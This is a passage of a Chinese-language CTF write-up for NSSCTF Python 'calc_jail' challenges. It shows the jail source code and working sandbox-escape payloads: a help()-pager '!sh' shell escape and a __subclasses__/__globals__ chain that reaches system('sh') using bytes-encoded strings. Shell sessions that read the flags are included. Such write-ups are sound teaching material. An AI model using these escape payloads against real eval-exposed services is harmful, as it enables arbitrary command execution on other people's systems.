class="token comment">#the length is be limited less than 7</span><span class="token comment">#it seems banned some payload </span><span class="token comment">#Can u escape it?Good luck!</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the python jail"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Let's have an beginner jail of calc"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">7</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于限定大小不大于7，那么之前的payload就不行了。查看大佬的wp，发现在python交互式终端中，可以使用help函数来进行rce</p><p>入交互式后，随便查询一种用法，由于太多，会使用more进行展示，造成溢出，在后面使用!命令即可造成命令执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Welcome to Python <span class="token number">3.8</span>'s <span class="token builtin">help</span> utility!If this <span class="token keyword">is</span> your first time using Python<span class="token punctuation">,</span> you should definitely check outthe tutorial on the Internet at https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>python<span class="token punctuation">.</span>org<span class="token operator">/</span><span class="token number">3.8</span><span class="token operator">/</span>tutorial<span class="token operator">/</span><span class="token punctuation">.</span>Enter the name of <span class="token builtin">any</span> module<span class="token punctuation">,</span> keyword<span class="token punctuation">,</span> <span class="token keyword">or</span> topic to get <span class="token builtin">help</span> on writingPython programs <span class="token keyword">and</span> using Python modules<span class="token punctuation">.</span>  To quit this <span class="token builtin">help</span> utility <span class="token keyword">and</span><span class="token keyword">return</span> to the interpreter<span class="token punctuation">,</span> just <span class="token builtin">type</span> <span class="token string">"quit"</span><span class="token punctuation">.</span>To get a <span class="token builtin">list</span> of available modules<span class="token punctuation">,</span> keywords<span class="token punctuation">,</span> symbols<span class="token punctuation">,</span> <span class="token keyword">or</span> topics<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token string">"modules"</span><span class="token punctuation">,</span> <span class="token string">"keywords"</span><span class="token punctuation">,</span> <span class="token string">"symbols"</span><span class="token punctuation">,</span> <span class="token keyword">or</span> <span class="token string">"topics"</span><span class="token punctuation">.</span>  Each module also comes<span class="token keyword">with</span> a one<span class="token operator">-</span>line summary of what it does<span class="token punctuation">;</span> to <span class="token builtin">list</span> the modules whose name<span class="token keyword">or</span> summary contain a given string such <span class="token keyword">as</span> <span class="token string">"spam"</span><span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token string">"modules spam"</span><span class="token punctuation">.</span><span class="token builtin">help</span><span class="token operator">></span> modules<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入!sh就可以进入shell里面</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">help</span><span class="token operator">></span> reHelp on module re<span class="token punctuation">:</span>NAME    re <span class="token operator">-</span> Support <span class="token keyword">for</span> regular expressions <span class="token punctuation">(</span>RE<span class="token punctuation">)</span><span class="token punctuation">.</span>MODULE REFERENCE    https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>python<span class="token punctuation">.</span>org<span class="token operator">/</span><span class="token number">3.8</span><span class="token operator">/</span>library<span class="token operator">/</span>re    The following documentation <span class="token keyword">is</span> automatically generated <span class="token keyword">from</span> the Python    source files<span class="token punctuation">.</span>  It may be incomplete<span class="token punctuation">,</span> incorrect <span class="token keyword">or</span> include features that    are considered implementation detail <span class="token keyword">and</span> may vary between Python    implementations<span class="token punctuation">.</span>  When <span class="token keyword">in</span> doubt<span class="token punctuation">,</span> consult the module reference at the    location listed above<span class="token punctuation">.</span>DESCRIPTION    This module provides regular expression matching operations similar to    those found <span class="token keyword">in</span> Perl<span class="token punctuation">.</span>  It supports both <span class="token number">8</span><span class="token operator">-</span>bit <span class="token keyword">and</span> Unicode strings<span class="token punctuation">;</span> both    the pattern <span class="token keyword">and</span> the strings being processed can contain null <span class="token builtin">bytes</span> <span class="token keyword">and</span>    characters outside the US ASCII <span class="token builtin">range</span><span class="token punctuation">.</span>    Regular expressions can contain both special <span class="token keyword">and</span> ordinary characters<span class="token punctuation">.</span>    Most ordinary characters<span class="token punctuation">,</span> like <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token keyword">or</span> <span class="token string">"0"</span><span class="token punctuation">,</span> are the simplest    regular expressions<span class="token punctuation">;</span> they simply <span class="token keyword">match</span> themselves<span class="token punctuation">.</span>  You can<span class="token operator">-</span><span class="token operator">-</span>More<span class="token operator">-</span><span class="token operator">-</span>    concatenate ordinary characters<span class="token punctuation">,</span> so last matches the string <span class="token string">'last'</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span>More<span class="token operator">-</span><span class="token operator">-</span>! sh! sh<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>More<span class="token operator">-</span><span class="token operator">-</span>!sh!sh<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>More<span class="token operator">-</span><span class="token operator">-</span>!ls!lsflag  server<span class="token punctuation">.</span>py<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>More<span class="token operator">-</span><span class="token operator">-</span>!cat flag!cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>c96135fd<span class="token operator">-</span><span class="token number">8475</span><span class="token operator">-</span>48df<span class="token operator">-</span>9a6e<span class="token operator">-</span>238520cb33ec<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="calc_jail_beginner_level4"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level4"></a> calc_jail_beginner_level4</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#No danger function,no chr,Try to hack me!!!!</span><span class="token comment">#Try to read file ./flag</span>BANLIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">]</span>eval_func <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token keyword">for</span> m <span class="token keyword">in</span> BANLIST<span class="token punctuation">:</span>    <span class="token keyword">del</span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token keyword">del</span> __loader__<span class="token punctuation">,</span> __builtins__<span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'"\'`'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _                _                           _       _ _   _                _ _  _    | |              (_)                         (_)     (_) | | |              | | || |   | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |   |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|                __/ |                          _/ |                                                   |___/                          |__/                                                                                                                                             '''</span><span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the python jail"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Let's have an beginner jail of calc"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>eval_func<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">禁用了chr函数导致不能使用字符拼接，禁用了__import__导致了help()以及breakpoint()不能使用。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是这里可以使用bytes函数以及deocode函数</p><p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28711</span>  _                _                           _       _ _   _                _ _  _ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>_ <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>__   _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>4f4a6110<span class="token operator">-</span><span class="token number">7705</span><span class="token operator">-</span>4ddb<span class="token operator">-</span>b6d3<span class="token operator">-</span>b9448d1651b0<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="calc_jail_beginner_level405"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level405"></a> calc_jail_beginner_level4.0.5</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28903</span>  _                _                           _       _ _   _                _ _  _    ___   _____ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">/</span> _ \ <span class="token operator">|</span> ____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>__ <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>__   _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token punctuation">(</span>_<span class="token punctuation">)</span>\___<span class="token punctuation">(</span>_<span class="token punctuation">)</span>____<span class="token operator">/</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span>Banned __loader__<span class="token punctuation">,</span><span class="token builtin">__import__</span><span class="token punctuation">,</span><span class="token builtin">compile</span><span class="token punctuation">,</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">,</span><span class="token builtin">globals</span> <span class="token keyword">and</span> `<span class="token punctuation">,</span>"<span class="token punctuation">,</span>' Good luck!<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有给源码，但是有提示，与上一个相同。</p><h4 id="calc_jail_beginner_level41"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level41"></a> calc_jail_beginner_level4.1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28800</span>  _                _                           _       _ _   _                _ _  _  __ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span>_ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>__   _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token punctuation">(</span>_<span class="token punctuation">)</span>_<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span>Banned __loader__<span class="token punctuation">,</span><span class="token builtin">__import__</span><span class="token punctuation">,</span><span class="token builtin">compile</span><span class="token punctuation">,</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">,</span><span class="token builtin">globals</span><span class="token punctuation">,</span><span class="token builtin">bytes</span> <span class="token keyword">and</span> `<span class="token punctuation">,</span>"<span class="token punctuation">,</span>' Good luck!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依然没有源码，但是bytes被ban了，那么从类中找到第六个 &lt;class ‘bytes_iterator’&gt;</p><p>那么构造bytes ：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token 